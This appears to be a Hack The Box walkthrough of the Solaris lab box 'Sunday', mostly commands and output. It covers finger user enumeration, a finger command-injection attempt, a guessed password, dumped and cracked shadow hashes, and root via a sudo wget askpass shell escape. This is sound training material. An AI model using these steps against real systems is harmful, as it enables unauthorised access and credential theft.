---
tags:
    - solaris
---
# HTB: [Sunday](https://app.hackthebox.com/machines/Sunday)

> [!tip]- Spoiler Summary
> This Solaris box is running `fingerd` which allows an attacker to enumerate users. One of the users has a trivially guessable password. With a foothold, the password hash for another user is readable and crackable. That user has Sudo privileges for `wget` which is easily escapable.

## Services

### TCP

```console
# Nmap 7.94SVN scan initiated Wed Aug  7 10:11:12 2024 as: nmap -v -sCV -p- -T4 --min-rate 10000 -oN tcp_full t
Increasing send delay for 10.10.10.76 from 0 to 5 due to 54 out of 134 dropped probes since last increase.
Increasing send delay for 10.10.10.76 from 5 to 10 due to 17 out of 41 dropped probes since last increase.
Warning: 10.10.10.76 giving up on port because retransmission cap hit (6).
Nmap scan report for t (10.10.10.76)
Host is up (0.084s latency).
Not shown: 63786 filtered tcp ports (no-response), 1744 closed tcp ports (reset)
PORT      STATE SERVICE VERSION
79/tcp    open  finger?
| fingerprint-strings:
|   GenericLines:
|     No one logged on
|   GetRequest:
|     Login Name TTY Idle When Where
|     HTTP/1.0 ???
|   HTTPOptions:
|     Login Name TTY Idle When Where
|     HTTP/1.0 ???
|     OPTIONS ???
|   Help:
|     Login Name TTY Idle When Where
|     HELP ???
|   RTSPRequest:
|     Login Name TTY Idle When Where
|     OPTIONS ???
|     RTSP/1.0 ???
|   SSLSessionReq, TerminalServerCookie:
|_    Login Name TTY Idle When Where
|_finger: No one logged on\x0D
111/tcp   open  rpcbind 2-4 (RPC #100000)
515/tcp   open  printer
6787/tcp  open  http    Apache httpd
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache
|_http-title: 400 Bad Request
22022/tcp open  ssh     OpenSSH 8.4 (protocol 2.0)
| ssh-hostkey:
|   2048 aa:00:94:32:18:60:a4:93:3b:87:a4:b6:f8:02:68:0e (RSA)
|_  256 da:2a:6c:fa:6b:b1:ea:16:1d:a6:54:a1:0b:2b:ee:48 (ED25519)
...
```

#### 79/tcp-finger

Wow, haven't seen this service for a long time.

```console
$ finger root@t
Login       Name               TTY         Idle    When    Where
root     Super-User            ssh          <Dec  7, 2023> 10.10.14.46
  kali@kali:~/htb-sunday/
$ finger admin@t
Login       Name               TTY         Idle    When    Where
adm      Admin                              < .  .  .  . >
dladm    Datalink Admin                     < .  .  .  . >
netadm   Network Admin                      < .  .  .  . >
netcfg   Network Configuratio               < .  .  .  . >
dhcpserv DHCP Configuration A               < .  .  .  . >
ikeuser  IKE Admin                          < .  .  .  . >
lp       Line Printer Admin                 < .  .  .  . >
```

No easy win for RCE, though:

```text
$ finger "|/bin/id@t"
Login       Name               TTY         Idle    When    Where
|/bin/id              ???
```

Enumerating users:

```console
$ ./finger-user-enum.pl -U /usr/share/wordlists/seclists/Usernames/Names/names.txt -t t
Starting finger-user-enum v1.0 ( http://pentestmonkey.net/tools/finger-user-enum )
 ----------------------------------------------------------
|                   Scan Information                       |
 ----------------------------------------------------------
Worker Processes ......... 5
Usernames file ........... /usr/share/wordlists/seclists/Usernames/Names/names.txt
Target count ............. 1
Username count ........... 10177
Target TCP port .......... 79
Query timeout ............ 5 secs
Relay Server ............. Not used
######## Scan started at Wed Aug  7 10:20:39 2024 #########
...
root@t: root     Super-User            ssh          <Dec  7, 2023> 10.10.14.46         ..
sammy@t: sammy           ???            ssh          <Apr 13, 2022> 10.10.14.13         ..
sunny@t: sunny           ???            ssh          <Apr 13, 2022> 10.10.14.13         ..
######## Scan completed at Wed Aug  7 10:27:10 2024 #########
16 results.
10177 queries in 391 seconds (26.0 queries / sec)

$ finger sammy@t
Login       Name               TTY         Idle    When    Where
sammy           ???            ssh          <Apr 13, 2022> 10.10.14.13

$ finger sunny@t
Login       Name               TTY         Idle    When    Where
sunny           ???            ssh          <Apr 13, 2022> 10.10.14.13
```

#### 6787/tcp-https

Looks like this is a Slowlaris box:

![](_/htb-sunday-20240807-1.png)

## RCE

I was able to enumerate two users using `finger-user-enum.pl`, `sunny` and `sammy`. The first one had a guessable password, `sunny`.

```console
sunny@sunday:~$ id
uid=101(sunny) gid=10(staff)
sunny@sunday:~$ cat /etc/passwd
root:x:0:0:Super-User:/root:/usr/bin/bash
daemon:x:1:1::/:/bin/sh
bin:x:2:2::/:/bin/sh
sys:x:3:3::/:/bin/sh
adm:x:4:4:Admin:/var/adm:/bin/sh
dladm:x:15:65:Datalink Admin:/:
netadm:x:16:65:Network Admin:/:
netcfg:x:17:65:Network Configuration Admin:/:
dhcpserv:x:18:65:DHCP Configuration Admin:/:
ftp:x:21:21:FTPD Reserved UID:/:
sshd:x:22:22:sshd privsep:/var/empty:/bin/false
smmsp:x:25:25:SendMail Message Submission Program:/:
aiuser:x:61:61:AI User:/:
ikeuser:x:67:12:IKE Admin:/:
lp:x:71:8:Line Printer Admin:/:/bin/sh
openldap:x:75:75:OpenLDAP User:/:/usr/bin/pfbash
webservd:x:80:80:WebServer Reserved UID:/:/bin/sh
unknown:x:96:96:Unknown Remote UID:/:/bin/sh
pkg5srv:x:97:97:pkg(7) server UID:/:
nobody:x:60001:60001:NFS Anonymous Access User:/:/bin/sh
noaccess:x:60002:65534:No Access User:/:/bin/sh
nobody4:x:65534:65534:SunOS 4.x NFS Anonymous Access User:/:/bin/sh
sammy:x:100:10::/home/sammy:/usr/bin/bash
sunny:x:101:10::/home/sunny:/usr/bin/bash
_ntp:x:73:73:NTP Daemon:/var/ntp:
sunny@sunday:~$ uname -a
SunOS sunday 5.11 11.4.42.111.0 i86pc i386 i86pc vmware
```

## PE

There are some history commands available.

```console
sunny@sunday:/home/sammy$ history
    1  su -
    2  su -
    3  cat /etc/resolv.conf
    4  su -
    5  ps auxwww|grep overwrite
    6  su -
    7  sudo -l
    8  sudo /root/troll
    9  ls /backup
   10  ls -l /backup
   11  cat /backup/shadow.backup
   12  sudo /root/troll
   13  sudo /root/troll
   14  su -
   15  sudo -l
   16  sudo /root/troll
   17  ps auxwww
   18  ps auxwww
   19  ps auxwww
   20  top
   21  top
   22  top
   23  ps auxwww|grep overwrite
   24  su -
   25  su -
   26  cat /etc/resolv.conf
   27  ps auxwww|grep over
   28  sudo -l
   29  sudo /root/troll
   30  sudo /root/troll
   31  sudo /root/troll
   32  sudo /root/troll
```

```console
sunny@sunday:/home/sammy$ cat /backup/shadow.backup
mysql:NP:::::::
openldap:*LK*:::::::
webservd:*LK*:::::::
postgres:NP:::::::
svctag:*LK*:6445::::::
nobody:*LK*:6445::::::
noaccess:*LK*:6445::::::
nobody4:*LK*:6445::::::
sammy:$5$Ebkn8jlK$i6SSPa0.u7Gd.0oJOT4T421N2OvsfXqAT1vCoYUOigB:6445::::::
sunny:$5$iRMbpnBv$Zh7s6D7ColnogCdiVE5Flz9vCZOMkUFxklRhhaShxv3:17636::::::
```

I was able to crack the password for `sammy` in a few seconds using:

```console
$ hashcat ./hash.sammy ./rockyou.txt --username
```

```console
sunny@sunday:/home/sammy$ su - sammy
Password:
Warning: at least 15 failed authentication attempts since last successful authentication.  The latest at Wed Aug 07 18:24 2024.
Oracle Solaris 11.4.42.111.0                  Assembled December 2021
-bash-5.1$ id
uid=100(sammy) gid=10(staff)
```

This seems like a rabbit hole, judging by the name:

```console
-bash-5.1$ sudo /root/troll
Password:
testing
uid=0(root) gid=0(root)
```

But this works:

```console
-bash-5.1$ sudo -l
User sammy may run the following commands on sunday:
    (ALL) ALL
    (root) NOPASSWD: /usr/bin/wget
-bash-5.1$ TF=$(mktemp)
chmod +x $TF
echo -e '#!/bin/sh\n/bin/sh 1>&0' >$TF
-bash-5.1$ sudo wget --use-askpass=$TF 0
root@sunday:/home/sammy# id
uid=0(root) gid=0(root)
```

## Post-exploitation

Here's the `/root/troll` stuff:

```console
root@sunday:/home/sammy# cat /root/troll
#!/usr/bin/bash
/usr/bin/echo "testing"
/usr/bin/id
root@sunday:/home/sammy# ls -l /root
total 8
-rw-r--r--   1 root     root         126 Dec 19  2021 overwrite
-rw-------   1 root     root          33 Aug  7 16:10 root.txt
-rwxr-xr-x   1 root     root          53 Aug  7 18:48 troll
-rw-r--r--   1 root     root          53 Dec 19  2021 troll.original
root@sunday:/home/sammy# cat /root/overwrite
#!/usr/bin/bash
while true; do
        /usr/gnu/bin/cat /root/troll.original > /root/troll
        /usr/gnu/bin/sleep 5
done
```
